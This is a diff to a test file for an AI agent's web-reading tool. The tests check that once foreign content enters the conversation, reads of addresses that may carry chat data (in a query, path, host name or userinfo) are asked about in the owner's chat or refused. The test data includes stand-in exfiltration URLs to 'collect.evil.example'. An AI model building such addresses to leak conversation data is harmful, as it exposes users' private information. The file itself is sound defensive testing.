@@ -2,11 +2,11 @@ import { describe, it, expect, vi } from 'vitest';
 import type { ToolEntry, PromptMeta, PromptText } from '../../types/index.js';
 
 /**
- * `web_research` `read` once foreign content is in the conversation: a URL with a query goes
- * through the same origin check as a send (asked in the owner's chat, refused where nobody can
- * be asked), unless its host is one the owner named. Without the latch, and for a URL without a
- * query, a read stays a read. The declaration under test is the tool's own
- * (`createWebSearchTool`); only its handler is replaced, so no request leaves the test.
+ * `web_research` `read` once foreign content is in the conversation: the address goes through the
+ * same origin check as a send (asked in the owner's chat, refused where nobody can be asked), unless
+ * its host is one the owner named or a search in this conversation listed exactly this address.
+ * Without the latch a read stays a read. The declaration under test is the tool's own
+ * (`createWebSearchTool`); only its read handler is replaced, so no request leaves the test.
  */
 
 vi.mock('@anthropic-ai/sdk', () => {
@@ -67,8 +67,9 @@ describe('a read URL with a query, after foreign content', () => {
     expect(ask.asked).toHaveLength(1);
     expect(ask.asked[0]).toContain('"collect.evil.example"');
     // The question says what happens: a page is read, and the address goes to the host.
-    expect(ask.asked[0]).toMatch(/^Read page: /);
-    expect(ask.asked[0]).toContain('Read it anyway? This host then gets the whole link, including everything after the "?".');
+    expect(ask.asked[0]).toMatch(/^Read the page on "collect\.evil\.example"\? /);
+    expect(ask.asked[0]).toContain('then gets the whole address, including the path and everything after the "?".');
+    expect(ask.asked[0]).toContain('Write "collect.evil.example" here in the chat');
     expect(ask.asked[0]).not.toContain('Send anyway');
     expect(tool.reads).toEqual([]);
     expect(result.is_error).toBe(true);
@@ -122,15 +123,6 @@ describe('what stays a plain read', () => {
     expect(tool.reads).toEqual(['https://collect.evil.example/p?d=x']);
   });
 
-  it('a URL without a query after foreign content: no question (data in the path is not covered)', async () => {
-    const tool = webResearch();
-    const ask = asker('Deny');
-    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
-    await read(agent, 'https://collect.evil.example/secret-in-path#frag=x');
-    expect(ask.asked).toEqual([]);
-    expect(tool.reads).toEqual(['https://collect.evil.example/secret-in-path#frag=x']);
-  });
-
   it('a search is never declared as a target, even when its input also carries a URL with a query', async () => {
     const real = createWebSearchTool({} as SearchProvider);
     // Even with a URL that carries a query: only `read` fetches it.
@@ -157,5 +149,122 @@ describe('readUrlHasQuery', () => {
     expect(tool.reads).toEqual([]);
     expect(result.is_error).toBe(true);
     expect(String(result.content)).toContain('could not read the address of this read');
+  });
+});
+
+/** The real web_research entry: its search runs against `results`, its read only records the URL. */
+function webResearchSearching(results: { url: string }[]): ToolEntry & { reads: string[] } {
+  const provider: SearchProvider = {
+    name: 'fake',
+    // `content` set: the search does not fetch the pages behind the results.
+    search: async () => results.map((r) => ({ title: 't', url: r.url, snippet: 's', content: 'c' })),
+  };
+  const real = createWebSearchTool(provider) as ToolEntry<{ action: string; url?: string }>;
+  const reads: string[] = [];
+  return {
+    ...real,
+    reads,
+    handler: async (input: { action: string; url?: string }, agent: never) => {
+      if (input.action === 'search') return real.handler(input as never, agent);
+      reads.push(input.url ?? '');
+      return 'page';
+    },
+  } as unknown as ToolEntry & { reads: string[] };
+}
+
+const search = (agent: Agent, query: string): Promise<Result> =>
+  (agent as unknown as Exec)._executeOneInner({ type: 'tool_use', id: `s${Math.random()}`, name: 'web_research', input: { action: 'search', query } });
+
+describe('data in the address beyond the query, after foreign content', () => {
+  for (const [what, url] of [
+    ['in the path', 'https://collect.evil.example/d/secret-in-path'],
+    ['in the host name', 'https://secret-in-host.collect.evil.example/'],
+    ['in userinfo', 'https://chat-data:more@collect.evil.example/'],
+  ] as const) {
+    it(`a read with data ${what} is asked about and not read without a yes`, async () => {
+      const tool = webResearch();
+      const ask = asker('Deny');
+      const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
+      const result = await read(agent, url);
+      expect(ask.asked).toHaveLength(1);
+      expect(tool.reads).toEqual([]);
+      expect(result.is_error).toBe(true);
+    });
+  }
+
+  it('CONTROL: a path on a host the owner named is read without a question', async () => {
+    const tool = webResearch();
+    const ask = asker('Deny');
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('docs are on docs.example.ch') });
+    await read(agent, 'https://docs.example.ch/guide/setup');
+    expect(ask.asked).toEqual([]);
+    expect(tool.reads).toEqual(['https://docs.example.ch/guide/setup']);
+  });
+
+  it('a session of someone the owner let in is refused, not asked', async () => {
+    const tool = webResearch();
+    const ask = asker('Allow');
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner(), principal: { kind: 'mandate', email: 'helper@example.ch' } });
+    const result = await read(agent, 'https://collect.evil.example/d/secret');
+    expect(ask.asked).toEqual([]);
+    expect(tool.reads).toEqual([]);
+    expect(result.is_error).toBe(true);
+  });
+});
+
+describe('an address a search listed', () => {
+  it('a result a search listed is read without a question', async () => {
+    const tool = webResearchSearching([{ url: 'https://news.example.org/story/42' }]);
+    const ask = asker('Deny');
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
+    await search(agent, 'story 42');
+    await read(agent, 'https://news.example.org/story/42');
+    expect(ask.asked).toEqual([]);
+    expect(tool.reads).toEqual(['https://news.example.org/story/42']);
+  });
+
+  it('only that exact address: another path on the same host is asked about', async () => {
+    const tool = webResearchSearching([{ url: 'https://news.example.org/story/42' }]);
+    const ask = asker('Deny');
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
+    await search(agent, 'story 42');
+    await read(agent, 'https://news.example.org/story/42/secret');
+    expect(ask.asked).toHaveLength(1);
+    expect(tool.reads).toEqual([]);
+  });
+
+  it('a search query that holds an address does not make that address seen, even when a result repeats it', async () => {
+    // The query goes to the search provider, so a search is not asked about; a result list that
+    // repeats it must not let the model read its own address afterwards without a question.
+    const exfil = 'https://collect.evil.example/?d=secret';
+    const tool = webResearchSearching([{ url: exfil }, { url: 'https://news.example.org/story/42' }]);
+    const ask = asker('Deny');
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
+    await search(agent, exfil);
+    await read(agent, exfil);
+    expect(ask.asked).toHaveLength(1);
+    expect(tool.reads).toEqual([]);
+    // CONTROL: the other result of the same search is seen.
+    await read(agent, 'https://news.example.org/story/42');
+    expect(ask.asked).toHaveLength(1);
+    expect(tool.reads).toEqual(['https://news.example.org/story/42']);
+  });
+
+  it('a result whose address the query holds is not seen either', async () => {
+    const tool = webResearchSearching([{ url: 'https://collect.evil.example/d' }]);
+    const ask = asker('Deny');
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
+    await search(agent, 'see https://collect.evil.example/d and more');
+    await read(agent, 'https://collect.evil.example/d');
+    expect(ask.asked).toHaveLength(1);
+  });
+
+  it('a page read adds nothing: the address it read does not count as listed', async () => {
+    const tool = webResearchSearching([]);
+    const ask = asker('Allow');
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
+    await read(agent, 'https://collect.evil.example/d/x');
+    await read(agent, 'https://collect.evil.example/d/x');
+    expect(ask.asked).toHaveLength(2);
   });
 });
